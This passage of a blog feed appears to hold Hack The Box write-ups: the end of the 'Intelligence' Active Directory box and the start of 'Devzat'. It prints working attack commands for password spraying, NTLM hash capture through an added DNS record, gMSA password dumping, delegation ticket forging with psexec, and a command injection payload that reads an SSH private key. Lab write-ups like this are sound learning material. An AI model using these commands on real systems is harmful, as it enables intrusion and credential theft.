(Domain: intelligence.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc.intelligence.htb| Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:dc.intelligence.htb| Not valid before: 2021-04-19T00:43:16|_Not valid after: 2022-04-19T00:43:16|_ssl-date: 2021-07-19T21:04:18+00:00; +7h03m54s from scanner time.3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc.intelligence.htb| Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:dc.intelligence.htb| Not valid before: 2021-04-19T00:43:16|_Not valid after: 2022-04-19T00:43:16|_ssl-date: 2021-07-19T21:04:18+00:00; +7h03m55s from scanner time.5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp open mc-nmf .NET Message Framing49667/tcp open msrpc Microsoft Windows RPC49691/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049692/tcp open msrpc Microsoft Windows RPC49702/tcp open msrpc Microsoft Windows RPC49714/tcp open msrpc Microsoft Windows RPC58601/tcp open msrpc Microsoft Windows RPCService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 7h03m54s, deviation: 0s, median: 7h03m53s| smb2-security-mode: | 2.02: |_ Message signing enabled and required| smb2-time: | date: 2021-07-19T21:03:42|_ start_date: N/A Enum4linux doesn’t get anything: enum4linux -a 10.10.10.248. SMB anonymous login allowed but no share: smbclient -L 10.10.10.248.Found 2 pdf files from web server❯ echo &#39;http://intelligence.htb/&#39; | hakrawlerhttp://intelligence.htb/documents/2020-01-01-upload.pdfhttp://intelligence.htb/documents/2020-12-15-upload.pdfDownload both pdfs❯ echo &#39;http://intelligence.htb/&#39; | hakrawler | grep pdf | xargs wget -q❯ ls -ltotal 56-rw-r--r-- 1 x00tex x00tex 26835 Apr 1 2021 2020-01-01-upload.pdf-rw-r--r-- 1 x00tex x00tex 27242 Apr 1 2021 2020-12-15-upload.pdfGot some usernames from pdf’s metadata with exiftool❯ exiftool * -Creator======== 2020-01-01-upload.pdfCreator : William.Lee======== 2020-12-15-upload.pdfCreator : Jose.Williams 2 image files readUsing kerbrute to verify valid usernames, and both users are valid.❯ kerbrute userenum -d intelligence.htb --dc 10.10.10.248 users.txt# ... [snip] ...2021/11/27 09:04:06 &amp;gt; Using KDC(s):2021/11/27 09:04:06 &amp;gt; 10.10.10.248:882021/11/27 09:04:07 &amp;gt; [+] VALID USERNAME: Jose.Williams@intelligence.htb2021/11/27 09:04:07 &amp;gt; [+] VALID USERNAME: William.Lee@intelligence.htb2021/11/27 09:04:07 &amp;gt; Done! Tested 2 usernames (2 valid) in 0.661 secondsDon’t get anything useful from those username.FootholdEnumerationBased on the pdf’s name i tried to fuzz more files based on their dates.❯ for y in {20..21};do for m in {01..12};do for d in {01..30};do echo 20$y-$m-$d;done;done;done | ffuf -w - -u &#39;http://intelligence.htb/documents/FUZZ-upload.pdf&#39; -ac -of json -o output.json# ... [snip] ...________________________________________________2020-01-20 [Status: 200, Size: 11632, Words: 157, Lines: 127, Duration: 411ms]2020-01-23 [Status: 200, Size: 11557, Words: 167, Lines: 136, Duration: 416ms]2020-01-22 [Status: 200, Size: 28637, Words: 236, Lines: 224, Duration: 412ms]2020-02-17 [Status: 200, Size: 11228, Words: 167, Lines: 132, Duration: 614ms]2020-01-10 [Status: 200, Size: 26400, Words: 232, Lines: 205, Duration: 413ms]2020-01-04 [Status: 200, Size: 27522, Words: 223, Lines: 196, Duration: 417ms]2020-02-28 [Status: 200, Size: 11543, Words: 167, Lines: 131, Duration: 619ms]2020-01-01 [Status: 200, Size: 26835, Words: 241, Lines: 209, Duration: 419ms]2020-01-25 [Status: 200, Size: 26252, Words: 225, Lines: 193, Duration: 421ms]2020-01-02 [Status: 200, Size: 27002, Words: 229, Lines: 199, Duration: 423ms]2020-01-30 [Status: 200, Size: 26706, Words: 242, Lines: 193, Duration: 426ms]2020-02-11 [Status: 200, Size: 25245, Words: 241, Lines: 198, Duration: 459ms]2020-03-21 [Status: 200, Size: 11250, Words: 157, Lines: 134, Duration: 426ms]2020-02-23 [Status: 200, Size: 27378, Words: 247, Lines: 213, Duration: 614ms]2020-02-24 [Status: 200, Size: 27332, Words: 237, Lines: 206, Duration: 615ms]2020-04-02 [Status: 200, Size: 11466, Words: 156, Lines: 134, Duration: 504ms]2020-03-04 [Status: 200, Size: 26194, Words: 235, Lines: 202, Duration: 611ms]2020-03-05 [Status: 200, Size: 26124, Words: 221, Lines: 205, Duration: 612ms]2020-03-12 [Status: 200, Size: 27143, Words: 233, Lines: 213, Duration: 584ms]2020-03-13 [Status: 200, Size: 24888, Words: 213, Lines: 204, Duration: 583ms]2020-03-17 [Status: 200, Size: 27227, Words: 221, Lines: 210, Duration: 408ms]2020-04-23 [Status: 200, Size: 24865, Words: 224, Lines: 212, Duration: 368ms]2020-04-04 [Status: 200, Size: 27949, Words: 226, Lines: 208, Duration: 507ms]2020-05-20 [Status: 200, Size: 27480, Words: 215, Lines: 200, Duration: 337ms]2020-04-15 [Status: 200, Size: 26689, Words: 227, Lines: 212, Duration: 619ms]2020-05-24 [Status: 200, Size: 11857, Words: 174, Lines: 149, Duration: 334ms]2020-05-29 [Status: 200, Size: 11532, Words: 159, Lines: 132, Duration: 432ms]2020-06-03 [Status: 200, Size: 11381, Words: 160, Lines: 136, Duration: 412ms]2020-06-02 [Status: 200, Size: 27797, Words: 236, Lines: 212, Duration: 417ms]2020-06-04 [Status: 200, Size: 26922, Words: 222, Lines: 220, Duration: 412ms]2020-06-08 [Status: 200, Size: 11540, Words: 165, Lines: 135, Duration: 412ms]2020-05-01 [Status: 200, Size: 28228, Words: 237, Lines: 194, Duration: 372ms]2020-05-03 [Status: 200, Size: 26093, Words: 233, Lines: 208, Duration: 357ms]2020-05-07 [Status: 200, Size: 26062, Words: 225, Lines: 183, Duration: 340ms]2020-06-12 [Status: 200, Size: 11575, Words: 159, Lines: 128, Duration: 393ms]2020-05-11 [Status: 200, Size: 27244, Words: 243, Lines: 207, Duration: 339ms]2020-06-15 [Status: 200, Size: 27121, Words: 245, Lines: 206, Duration: 376ms]2020-05-17 [Status: 200, Size: 26448, Words: 239, Lines: 207, Duration: 344ms]2020-06-21 [Status: 200, Size: 26060, Words: 246, Lines: 210, Duration: 350ms]2020-05-21 [Status: 200, Size: 26255, Words: 251, Lines: 194, Duration: 341ms]2020-06-25 [Status: 200, Size: 10662, Words: 157, Lines: 142, Duration: 357ms]2020-06-26 [Status: 200, Size: 27338, Words: 236, Lines: 205, Duration: 398ms]2020-06-28 [Status: 200, Size: 26390, Words: 216, Lines: 208, Duration: 392ms]2020-07-02 [Status: 200, Size: 27320, Words: 236, Lines: 202, Duration: 408ms]2020-06-30 [Status: 200, Size: 25634, Words: 234, Lines: 194, Duration: 411ms]2020-07-06 [Status: 200, Size: 24966, Words: 217, Lines: 183, Duration: 416ms]2020-07-08 [Status: 200, Size: 11910, Words: 167, Lines: 141, Duration: 413ms]2020-06-07 [Status: 200, Size: 27937, Words: 240, Lines: 217, Duration: 411ms]2020-06-14 [Status: 200, Size: 26443, Words: 236, Lines: 186, Duration: 361ms]2020-07-20 [Status: 200, Size: 12100, Words: 162, Lines: 138, Duration: 400ms]2020-06-22 [Status: 200, Size: 26278, Words: 239, Lines: 207, Duration: 351ms]2020-08-01 [Status: 200, Size: 27038, Words: 228, Lines: 205, Duration: 433ms]2020-08-03 [Status: 200, Size: 25405, Words: 247, Lines: 189, Duration: 400ms]2020-08-09 [Status: 200, Size: 11611, Words: 161, Lines: 144, Duration: 403ms]2020-08-19 [Status: 200, Size: 26885, Words: 231, Lines: 214, Duration: 425ms]2020-08-20 [Status: 200, Size: 10711, Words: 171, Lines: 133, Duration: 435ms]2020-07-24 [Status: 200, Size: 26321, Words: 211, Lines: 207, Duration: 424ms]2020-09-02 [Status: 200, Size: 27148, Words: 215, Lines: 203, Duration: 404ms]2020-09-04 [Status: 200, Size: 26986, Words: 245, Lines: 194, Duration: 395ms]2020-09-05 [Status: 200, Size: 26417, Words: 210, Lines: 193, Duration: 403ms]2020-09-06 [Status: 200, Size: 25551, Words: 238, Lines: 193, Duration: 407ms]2020-09-11 [Status: 200, Size: 12098, Words: 156, Lines: 146, Duration: 383ms]2020-09-13 [Status: 200, Size: 26521, Words: 219, Lines: 212, Duration: 388ms]2020-09-22 [Status: 200, Size: 25072, Words: 225, Lines: 194, Duration: 401ms]2020-09-27 [Status: 200, Size: 26809, Words: 248, Lines: 227, Duration: 384ms]2020-09-29 [Status: 200, Size: 24586, Words: 228, Lines: 221, Duration: 367ms]2020-09-30 [Status: 200, Size: 26080, Words: 244, Lines: 197, Duration: 370ms]2020-10-05 [Status: 200, Size: 11248, Words: 162, Lines: 127, Duration: 370ms]2020-10-19 [Status: 200, Size: 27196, Words: 244, Lines: 213, Duration: 392ms]2020-09-16 [Status: 200, Size: 26959, Words: 236, Lines: 207, Duration: 410ms]2020-11-01 [Status: 200, Size: 26599, Words: 237, Lines: 186, Duration: 403ms]2020-11-03 [Status: 200, Size: 25568, Words: 222, Lines: 186, Duration: 415ms]2020-11-06 [Status: 200, Size: 25964, Words: 251, Lines: 220, Duration: 421ms]2020-11-10 [Status: 200, Size: 25472, Words: 229, Lines: 216, Duration: 436ms]2020-11-11 [Status: 200, Size: 26461, Words: 226, Lines: 206, Duration: 442ms]2020-11-13 [Status: 200, Size: 11074, Words: 153, Lines: 134, Duration: 447ms]2020-11-24 [Status: 200, Size: 11412, Words: 151, Lines: 133, Duration: 425ms]2020-11-30 [Status: 200, Size: 27286, Words: 252, Lines: 207, Duration: 399ms]2020-12-10 [Status: 200, Size: 26762, Words: 224, Lines: 200, Duration: 410ms]2020-12-15 [Status: 200, Size: 27242, Words: 242, Lines: 210, Duration: 397ms]2020-12-20 [Status: 200, Size: 11902, Words: 163, Lines: 137, Duration: 378ms]2020-12-24 [Status: 200, Size: 26825, Words: 234, Lines: 209, Duration: 404ms]2020-12-28 [Status: 200, Size: 11480, Words: 164, Lines: 127, Duration: 396ms]2020-12-30 [Status: 200, Size: 25109, Words: 218, Lines: 191, Duration: 401ms]2021-01-03 [Status: 200, Size: 27828, Words: 233, Lines: 206, Duration: 405ms]2021-01-14 [Status: 200, Size: 11178, Words: 170, Lines: 137, Duration: 357ms]2021-01-25 [Status: 200, Size: 27582, Words: 237, Lines: 215, Duration: 414ms]2021-01-30 [Status: 200, Size: 25939, Words: 227, Lines: 194, Duration: 428ms]2021-02-10 [Status: 200, Size: 26978, Words: 230, Lines: 205, Duration: 429ms]2021-02-13 [Status: 200, Size: 27053, Words: 232, Lines: 212, Duration: 443ms]2021-02-21 [Status: 200, Size: 26032, Words: 241, Lines: 214, Duration: 438ms]2021-02-25 [Status: 200, Size: 26700, Words: 228, Lines: 180, Duration: 443ms]2021-03-01 [Status: 200, Size: 11254, Words: 175, Lines: 135, Duration: 425ms]2021-03-07 [Status: 200, Size: 10676, Words: 164, Lines: 139, Duration: 398ms]2021-03-10 [Status: 200, Size: 25109, Words: 240, Lines: 199, Duration: 379ms]2021-03-18 [Status: 200, Size: 27992, Words: 220, Lines: 203, Duration: 370ms]2021-03-21 [Status: 200, Size: 26810, Words: 229, Lines: 205, Duration: 348ms]2021-03-25 [Status: 200, Size: 27327, Words: 231, Lines: 211, Duration: 343ms]2021-03-27 [Status: 200, Size: 12127, Words: 166, Lines: 141, Duration: 358ms]:: Progress: [720/720] :: Job [1/1] :: 97 req/sec :: Duration: [0:00:08] :: Errors: 0 ::Holly hell got so many pdfs. Total 99 files❯ cat output.json | jq &#39;.results[] .url&#39; | wc -l99wget all files❯ cat output.json | jq &#39;.results[] .url&#39; | xargs wget# ... [snip] ...❯ ls2020-01-01-upload.pdf 2020-04-02-upload.pdf 2020-06-15-upload.pdf 2020-09-06-upload.pdf 2020-12-20-upload.pdf2020-01-02-upload.pdf 2020-04-04-upload.pdf 2020-06-21-upload.pdf 2020-09-11-upload.pdf 2020-12-24-upload.pdf2020-01-04-upload.pdf 2020-04-15-upload.pdf 2020-06-22-upload.pdf 2020-09-13-upload.pdf 2020-12-28-upload.pdf2020-01-10-upload.pdf 2020-04-23-upload.pdf 2020-06-25-upload.pdf 2020-09-16-upload.pdf 2020-12-30-upload.pdf2020-01-20-upload.pdf 2020-05-01-upload.pdf 2020-06-26-upload.pdf 2020-09-22-upload.pdf 2021-01-03-upload.pdf2020-01-22-upload.pdf 2020-05-03-upload.pdf 2020-06-28-upload.pdf 2020-09-27-upload.pdf 2021-01-14-upload.pdf2020-01-23-upload.pdf 2020-05-07-upload.pdf 2020-06-30-upload.pdf 2020-09-29-upload.pdf 2021-01-25-upload.pdf2020-01-25-upload.pdf 2020-05-11-upload.pdf 2020-07-02-upload.pdf 2020-09-30-upload.pdf 2021-01-30-upload.pdf2020-01-30-upload.pdf 2020-05-17-upload.pdf 2020-07-06-upload.pdf 2020-10-05-upload.pdf 2021-02-10-upload.pdf2020-02-11-upload.pdf 2020-05-20-upload.pdf 2020-07-08-upload.pdf 2020-10-19-upload.pdf 2021-02-13-upload.pdf2020-02-17-upload.pdf 2020-05-21-upload.pdf 2020-07-20-upload.pdf 2020-11-01-upload.pdf 2021-02-21-upload.pdf2020-02-23-upload.pdf 2020-05-24-upload.pdf 2020-07-24-upload.pdf 2020-11-03-upload.pdf 2021-02-25-upload.pdf2020-02-24-upload.pdf 2020-05-29-upload.pdf 2020-08-01-upload.pdf 2020-11-06-upload.pdf 2021-03-01-upload.pdf2020-02-28-upload.pdf 2020-06-02-upload.pdf 2020-08-03-upload.pdf 2020-11-10-upload.pdf 2021-03-07-upload.pdf2020-03-04-upload.pdf 2020-06-03-upload.pdf 2020-08-09-upload.pdf 2020-11-11-upload.pdf 2021-03-10-upload.pdf2020-03-05-upload.pdf 2020-06-04-upload.pdf 2020-08-19-upload.pdf 2020-11-13-upload.pdf 2021-03-18-upload.pdf2020-03-12-upload.pdf 2020-06-07-upload.pdf 2020-08-20-upload.pdf 2020-11-24-upload.pdf 2021-03-21-upload.pdf2020-03-13-upload.pdf 2020-06-08-upload.pdf 2020-09-02-upload.pdf 2020-11-30-upload.pdf 2021-03-25-upload.pdf2020-03-17-upload.pdf 2020-06-12-upload.pdf 2020-09-04-upload.pdf 2020-12-10-upload.pdf 2021-03-27-upload.pdf2020-03-21-upload.pdf 2020-06-14-upload.pdf 2020-09-05-upload.pdf 2020-12-15-upload.pdfRunning exiftool tool again to new downloaded files and get more usernames, total 30❯ exiftool * -Creator -s -s -s | grep -v &#39;========&#39; | head -n -1 | sort | uniq | wc -l30And all usernames are valid❯ kerbrute userenum -d intelligence.htb --dc 10.10.10.248 users.txt# ... [snip] ...2021/11/27 10:30:10 &amp;gt; Using KDC(s):2021/11/27 10:30:10 &amp;gt; 10.10.10.248:882021/11/27 10:30:11 &amp;gt; [+] VALID USERNAME: David.Reed@intelligence.htb2021/11/27 10:30:11 &amp;gt; [+] VALID USERNAME: Brian.Baker@intelligence.htb2021/11/27 10:30:11 &amp;gt; [+] VALID USERNAME: Anita.Roberts@intelligence.htb2021/11/27 10:30:11 &amp;gt; [+] VALID USERNAME: Danny.Matthews@intelligence.htb2021/11/27 10:30:11 &amp;gt; [+] VALID USERNAME: Ian.Duncan@intelligence.htb2021/11/27 10:30:11 &amp;gt; [+] VALID USERNAME: Darryl.Harris@intelligence.htb2021/11/27 10:30:11 &amp;gt; [+] VALID USERNAME: Brian.Morris@intelligence.htb2021/11/27 10:30:11 &amp;gt; [+] VALID USERNAME: David.Wilson@intelligence.htb2021/11/27 10:30:11 &amp;gt; [+] VALID USERNAME: Daniel.Shelton@intelligence.htb2021/11/27 10:30:11 &amp;gt; [+] VALID USERNAME: David.Mcbride@intelligence.htb2021/11/27 10:30:11 &amp;gt; [+] VALID USERNAME: Jason.Wright@intelligence.htb2021/11/27 10:30:11 &amp;gt; [+] VALID USERNAME: Kelly.Long@intelligence.htb2021/11/27 10:30:11 &amp;gt; [+] VALID USERNAME: Richard.Williams@intelligence.htb2021/11/27 10:30:11 &amp;gt; [+] VALID USERNAME: Jennifer.Thomas@intelligence.htb2021/11/27 10:30:11 &amp;gt; [+] VALID USERNAME: Kaitlyn.Zimmerman@intelligence.htb2021/11/27 10:30:11 &amp;gt; [+] VALID USERNAME: Jessica.Moody@intelligence.htb2021/11/27 10:30:11 &amp;gt; [+] VALID USERNAME: Nicole.Brock@intelligence.htb2021/11/27 10:30:11 &amp;gt; [+] VALID USERNAME: John.Coleman@intelligence.htb2021/11/27 10:30:11 &amp;gt; [+] VALID USERNAME: Jose.Williams@intelligence.htb2021/11/27 10:30:11 &amp;gt; [+] VALID USERNAME: Jason.Patterson@intelligence.htb2021/11/27 10:30:12 &amp;gt; [+] VALID USERNAME: Teresa.Williamson@intelligence.htb2021/11/27 10:30:12 &amp;gt; [+] VALID USERNAME: Samuel.Richardson@intelligence.htb2021/11/27 10:30:12 &amp;gt; [+] VALID USERNAME: Scott.Scott@intelligence.htb2021/11/27 10:30:12 &amp;gt; [+] VALID USERNAME: Veronica.Patel@intelligence.htb2021/11/27 10:30:12 &amp;gt; [+] VALID USERNAME: Tiffany.Molina@intelligence.htb2021/11/27 10:30:12 &amp;gt; [+] VALID USERNAME: Thomas.Hall@intelligence.htb2021/11/27 10:30:12 &amp;gt; [+] VALID USERNAME: Travis.Evans@intelligence.htb2021/11/27 10:30:12 &amp;gt; [+] VALID USERNAME: William.Lee@intelligence.htb2021/11/27 10:30:12 &amp;gt; [+] VALID USERNAME: Stephanie.Young@intelligence.htb2021/11/27 10:30:12 &amp;gt; [+] VALID USERNAME: Thomas.Valenzuela@intelligence.htb2021/11/27 10:30:12 &amp;gt; Done! Tested 30 usernames (30 valid) in 1.255 secondsRead through all the pdfs using pdf2txt tool and somewhere in the text found a password, don’t know which pdf contains this text but we got a password.❯ pdf2txt *# ... [snip] ...New Account GuideWelcome to Intelligence Corp!Please login using your username and the default password of:NewIntelligenceCorpUser9876After logging in please change your password as soon as possible.# ... [snip] ...Brute forcing with crackmapexec and got working smb creds.❯ cme smb intelligence.htb -u users.txt -p &#39;NewIntelligenceCorpUser9876&#39; --continue-on-successSMB 10.10.10.248 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)# ... [snip] ...SMB 10.10.10.248 445 DC [+] intelligence.htb\\Tiffany.Molina:NewIntelligenceCorpUser9876 # ... [snip] ...❯ cme smb intelligence.htb -u &#39;Tiffany.Molina&#39; -p &#39;NewIntelligenceCorpUser9876&#39; --sharesSMB 10.10.10.248 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)SMB 10.10.10.248 445 DC [+] intelligence.htb\\Tiffany.Molina:NewIntelligenceCorpUser9876 SMB 10.10.10.248 445 DC [+] Enumerated sharesSMB 10.10.10.248 445 DC Share Permissions RemarkSMB 10.10.10.248 445 DC ----- ----------- ------SMB 10.10.10.248 445 DC ADMIN$ Remote AdminSMB 10.10.10.248 445 DC C$ Default shareSMB 10.10.10.248 445 DC IPC$ READ Remote IPCSMB 10.10.10.248 445 DC IT READ SMB 10.10.10.248 445 DC NETLOGON READ Logon server share SMB 10.10.10.248 445 DC SYSVOL READ Logon server share SMB 10.10.10.248 445 DC Users READThere are 2 shares in SMB that looks interesting❯ smbmap -H 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -r \\IT[+] IP: 10.10.10.248:445 Name: intelligence.htb Disk Permissions Comment ---- ----------- ------- IT READ ONLY .\\IT\\* dr--r--r-- 0 Mon Apr 19 06:20:58 2021 . dr--r--r-- 0 Mon Apr 19 06:20:58 2021 .. fr--r--r-- 1046 Mon Apr 19 06:20:58 2021 downdetector.ps1❯ smbmap -H 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -r \\Users[+] IP: 10.10.10.248:445 Name: intelligence.htb Disk Permissions Comment ---- ----------- ------- Users READ ONLY .\\Users\\* dw--w--w-- 0 Mon Apr 19 06:50:26 2021 . dw--w--w-- 0 Mon Apr 19 06:50:26 2021 .. dr--r--r-- 0 Mon Apr 19 05:48:39 2021 Administrator dr--r--r-- 0 Mon Apr 19 08:46:30 2021 All Users dw--w--w-- 0 Mon Apr 19 07:47:40 2021 Default dr--r--r-- 0 Mon Apr 19 08:46:30 2021 Default User fr--r--r-- 174 Mon Apr 19 08:45:17 2021 desktop.ini dw--w--w-- 0 Mon Apr 19 05:48:39 2021 Public dr--r--r-- 0 Mon Apr 19 06:50:26 2021 Ted.Graves dr--r--r-- 0 Mon Apr 19 06:21:46 2021 Tiffany.MolinaGot the user.txt from “Tiffany.Molina” User folder and there’s another user on the box “Ted.Graves”.smb: \\Tiffany.Molina\\Desktop\\&amp;gt; dir . DR 0 Mon Apr 19 06:21:46 2021 .. DR 0 Mon Apr 19 06:21:46 2021 user.txt AR 34 Sat Nov 27 01:48:28 2021 3770367 blocks of size 4096. 1450547 blocks availableThere’s only 1 interesting file is downdetector.ps1 file in \\IT share.# Check web server status. Scheduled to run every 5minImport-Module ActiveDirectory foreach($record in Get-ChildItem &quot;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&quot; | Where-Object Name -like &quot;web*&quot;) {try {$request = Invoke-WebRequest -Uri &quot;http://$($record.Name)&quot; -UseDefaultCredentialsif(.StatusCode -ne 200) {Send-MailMessage -From &#39;Ted Graves &amp;lt;Ted.Graves@intelligence.htb&amp;gt;&#39; -To &#39;Ted Graves &amp;lt;Ted.Graves@intelligence.htb&amp;gt;&#39; -Subject &quot;Host: $($record.Name) is down&quot;}} catch {}}This script is running on Scheduler in every 5min from user “Ted.Graves” and checking inactive hosts from domain controller’s DNS records which start with web* using his creds.If we add a DNS record in the domain control with that we can do NTLM Relay Attack.NTLM Relay AttackFor that we can use responder; Source hacktricksAdding DNS record in the domain controller with krbrelayx dnstool.py script.❯ python dnstool.py -u &#39;intelligence.htb\\Tiffany.Molina&#39; -p NewIntelligenceCorpUser9876 -r webduck -d 10.10.14.42 -a add 10.10.10.248[-] Connecting to host...[-] Binding to host[+] Bind OK[-] Adding extra record[+] LDAP operation completed successfullyRunning responder on “tun0” interface on Analyze mode❯ sudo responder -I tun0 -A -v #and that hash cracked with johnPrivescBloodHound https://book.hacktricks.xyz/windows/active-directory-methodology/bloodhoundingesting ADBloodHound.py is a Python based ingestor for BloodHound which reads data from Active Directory and create a database which can be read from BloodHound.pip install bloodhoundRunning❯ bloodhound-python -ns 10.10.10.248 -d intelligence.htb -u &#39;Ted.Graves&#39; -p &#39;Mr.Teddy&#39; -c allINFO: Found AD domain: intelligence.htbINFO: Connecting to LDAP server: dc.intelligence.htbINFO: Found 1 domainsINFO: Found 1 domains in the forestINFO: Found 2 computersINFO: Connecting to LDAP server: dc.intelligence.htbINFO: Found 42 usersINFO: Found 54 groupsINFO: Found 0 trustsINFO: Starting computer enumeration with 10 workersINFO: Querying computer: svc_int.intelligence.htbINFO: Querying computer: dc.intelligence.htbINFO: Skipping enumeration for svc_int.intelligence.htb since it could not be resolved.INFO: Done in 01M 10SStart BloodHound and load all json file created by bloodhound-python ingestorAnd here is the shortest path to the DOMAIN. SVC_INT@INTELLIGENCE.HTB is a Group Managed Service Account. The group ITSUPPORT@INTELLIGENCE.HTB can retrieve the password for the GMSA SVC_INT@INTELLIGENCE.HTB. The intended use of a GMSA is to allow certain computer accounts to retrieve the password for the GMSA, then run local services as the GMSA. An attacker with control of an authorized principal may abuse that privilege to impersonate the GMSA. The user SVC_INT@INTELLIGENCE.HTB has the constrained delegation privilege to the computer S-1-5-21-4210132550-3389855604-3437519686-1000. The constrained delegation primitive allows a principal to authenticate as any user to specific services (found in the msds-AllowedToDelegateTo LDAP property in the source node tab) on the target computer. Reading GMSA Password https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#gmsa-attributes-in-the-active-directoryReading GMSA passwords with gMSADumper❯ python gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l dc.intelligence.htbUsers or groups who can read password for svc_int$: &amp;gt; DC$ &amp;gt; itsupportsvc_int$:::b98d4cef68f72a98dfeed732d1b1abcaSilver ticket Attack“If you have compromised a user account or a computer (machine account) that has kerberos constrained delegation enabled, it’s possible to impersonate any domain user (including administrator) and authenticate to a service that the user account is trusted to delegate to.” ; SourceAnd “svc_int$” has the constrained delegation privilege to the computer S-1-5-21-4210132550-3389855604-3437519686-1000 which is a member of the group ENTERPRISE DOMAIN CONTROLLERS@INTELLIGENCE.HTB. https://book.hacktricks.xyz/windows/active-directory-methodology/silver-ticketBefore generating Silver ticket, sync time with the target domain: sudo ntpdate 10.10.10.248Generating silver ticket with impacket getST.py script❯ impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int$ -hashes b98d4cef68f72a98dfeed732d1b1abca:b98d4cef68f72a98dfeed732d1b1abcaThen Store Administrator.ccache path in a “KRB5CCNAME” environment variableexport KRB5CCNAME=./Administrator.ccacheRun impacket-psexec to get shell❯ impacket-psexec intelligence.htb/Administrator@dc.intelligence.htb -k -no-pass" }, { "title": "Hackthebox - Devzat", "url": "/posts/devzat/", "categories": "hackthebox, linux", "tags": "command injection, influxdb version 1.7.5, cve-2019-20933, lfi", "date": "2021-11-26 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.11.118 devzat.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)| 256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)|_ 256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)80/tcp open http Apache httpd 2.4.41|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Did not follow redirect to http://devzat.htb/8000/tcp open ssh (protocol 2.0)| fingerprint-strings: | NULL: |_ SSH-2.0-Go| ssh-hostkey: |_ 3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port8000-TCP:V=7.91SVN%I=7%D=11/26%Time=61A0C256%P=x86_64-unknown-linuxSF:-gnu%r(NULL,C,&quot;SSH-2\\.0-Go\\r\\n&quot;);Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Port 8000 is running a ssh messaging server: devzat Found email from webapp: patrick@devzat.htb Username: patrick Running subdomain scan with ffuf❯ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H &quot;Host: FUZZ.devzat.htb&quot; -u http://10.10.11.118 -ac -t 100 -v# ... [snip] ...[Status: 200, Size: 510, Words: 20, Lines: 21, Duration: 343ms]| URL | http://10.10.11.118 * FUZZ: pets found subdomain: pets.devzat.htbsubdomain is running on api and fetch pets from /api/pet endpoint.FootholdCommand Injectionthere is a feature to add pet in the list, while testing this feature i notice a suspicious error.curl -s -X POST &#39;http://pets.devzat.htb/api/pet&#39; -d $&#39;{&quot;name&quot;:&quot;cat&quot;,&quot;species&quot;:&quot;test&quot;}&#39; 1&amp;gt;/dev/null; curl -s &#39;http://pets.devzat.htb/api/pet&#39; | tr &#39;{&#39; &#39;\\n&#39; | tail -n 1&quot;name&quot;:&quot;cat&quot;,&quot;species&quot;:&quot;test&quot;,&quot;characteristics&quot;:&quot;exit status 1&quot;}]curl -s -X POST &#39;http://pets.devzat.htb/api/pet&#39; -d $&#39;{&quot;name&quot;:&quot;cat&quot;,&quot;species&quot;:&quot;test\\&#39;&quot;}&#39; 1&amp;gt;/dev/null; curl -s &#39;http://pets.devzat.htb/api/pet&#39; | tr &#39;{&#39; &#39;\\n&#39; | tail -n 1&quot;name&quot;:&quot;cat&quot;,&quot;species&quot;:&quot;test&#39;&quot;,&quot;characteristics&quot;:&quot;exit status 2&quot;}]There errors are related to bash script. ;SourceWhen i send the POST request with “species” value that is not defined, get response “exit status 1” and when i add extra &#39; in the “species” value get the response “exit status 2”. These errors match the bash exit code referenceIf “species” parameter goes into a bash script then this could be command injection.And this is indeed a command injection bug❯ curl -s -X POST &#39;http://pets.devzat.htb/api/pet&#39; -d $&#39;{&quot;name&quot;:&quot;cat&quot;,&quot;species&quot;:&quot;;id&quot;}&#39; 1&amp;gt;/dev/null; curl -s &#39;http://pets.devzat.htb/api/pet&#39; | tr &#39;{&#39; &#39;\\n&#39; | tail -n 1&quot;name&quot;:&quot;cat&quot;,&quot;species&quot;:&quot;;id&quot;,&quot;characteristics&quot;:&quot;cat: characteristics/: Is a directory\\nuid=1000(patrick) gid=1000(patrick) groups=1000(patrick)\\n&quot;}]python script to beautify command outputimport reimport requests as rcmd = &#39;ls -la&#39; # &#39;cat /home/patrick/.ssh/id_rsa&#39;postrspn = r.post(&#39;http://pets.devzat.htb/api/pet&#39;, json={&quot;name&quot;: &quot;cat&quot;, &quot;species&quot;: f&quot;;{cmd}&quot;})if &#39;Pet was added successfully&#39; in postrspn.text: getrspn = r.get(&#39;http://pets.devzat.htb/api/pet&#39;) parse = re.findall(r&#39;elephant.&quot;},(.*?)&quot;}]&#39;, 